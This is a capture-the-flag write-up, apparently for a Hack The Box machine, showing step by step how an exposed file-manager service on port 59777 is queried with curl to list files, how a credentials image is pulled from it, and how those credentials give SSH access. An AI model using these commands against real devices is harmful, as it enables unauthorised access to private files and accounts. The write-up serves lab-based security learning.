Googling open ports shows that port 59777 has some vulnerabilites that allow for a sort of code execution
```bash
curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listAppsAll\"}" http://10.10.10.247:59777
```
The commands you can execute are limited to:
```yaml
listFiles: List all the files
listPics: List all the pictures
listVideos: List all the videos
listAudios: List all the audio files
listApps: List all the apps installed
listAppsSystem: List all the system apps
listAppsPhone: List all the phone apps
listAppsSdcard: List all the apk files in the sdcard
listAppsAll: List all the apps installed (system apps included)
getDeviceInfo: Get device info
appPull: Pull an app from the device. Package name parameter is needed
appLaunch: Launch an app. Package name parameter is needed
getAppThumbnail: Get the icon of an app. Package name parameter is needed
```
Using the listFiles command shows something interesting
```json
[
{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)", },
]%
```
Specifically the "creds.jpg" is interesting

Visit *10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg* to find some creds!
![[Pasted image 20210707231343.png]]

Try SSH into box as user kristi
```bash
hunter@kali ~/htb/explore$ ssh -p 2222 kristi@10.10.10.247
Password: 
:/ $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
:/ $
```